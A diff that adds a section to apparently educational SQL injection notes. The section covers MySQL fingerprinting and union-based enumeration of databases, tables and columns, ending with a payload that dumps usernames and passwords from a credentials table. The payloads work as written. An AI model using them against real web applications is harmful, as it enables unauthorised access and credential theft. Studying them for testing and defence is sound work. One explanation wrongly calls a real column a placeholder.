@@ -730,3 +730,91 @@ SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND
 
 ---
 
+# Database Enumeration 
+
+## MySQL Fingerprinting
+
+- **Identify DBMS Type**: Helps determine the right queries to use.
+
+- **Fingerprint MySQL**:
+  - `SELECT @@version`:
+    - **Purpose**: Identifies the version of the MySQL database.
+    - **Expected Output**: MySQL version, e.g., `10.3.22-MariaDB-1ubuntu1`.
+    - **Wrong Output**: Returns MSSQL version if it's MSSQL, or an error if it's another DBMS.
+  
+  - `SELECT POW(1,1)`:
+    - **Purpose**: Simple mathematical operation to confirm MySQL.
+    - **Expected Output**: `1`.
+    - **Wrong Output**: Returns an error with other DBMS.
+  
+  - `SELECT SLEEP(5)`:
+    - **Purpose**: Delays the response to confirm a blind SQL injection.
+    - **Expected Output**: Delays response for 5 seconds and returns `0`.
+    - **Wrong Output**: Will not delay response with other DBMS.
+
+### INFORMATION_SCHEMA Database
+
+- **Purpose**: Contains metadata about all databases and tables.
+- **Reference Tables**: Use the dot `.` operator to reference tables in other databases.
+  ```sql
+  SELECT * FROM my_database.users;
+  ```
+
+#### SCHEMATA Table
+
+- **Purpose**: Lists all databases on the server.
+  ```sql
+  SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+  ```
+  - **Explanation**: This will list all database names. The columns `1`, `3`, and `4` are placeholders to match the number of columns in the original query.
+
+#### Current Database
+
+- **Find Current Database**:
+  ```sql
+  SELECT database();
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION select 1,database(),2,3-- -
+  ```
+  - **Explanation**: This retrieves the name of the current database the application is using. Here `1`, `2`, and `3` are placeholders.
+
+#### TABLES Table
+
+- **Purpose**: Lists all tables within a specific database.
+  ```sql
+  SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev';
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+  ```
+  - **Explanation**: This query retrieves the names of all tables within the `dev` database. The columns `1` and `4` are placeholders.
+
+#### COLUMNS Table
+
+- **Purpose**: Lists all columns within a specific table.
+  ```sql
+  SELECT COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials';
+  ```
+- **Union Injection Example**:
+  ```sql
+  cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+  ```
+  - **Explanation**: This query retrieves the column names from the `credentials` table. The columns `1` and `TABLE_NAME` are placeholders.
+
+### Extracting Data
+
+- **Union Injection to Dump Data**:
+  ```sql
+  cn' UNION select 1, username, password, 4 from dev.credentials-- -
+  ```
+  - **Explanation**: This query dumps the `username` and `password` data from the `dev.credentials` table. The columns `1` and `4` are placeholders to balance the number of columns.
+
+---
+
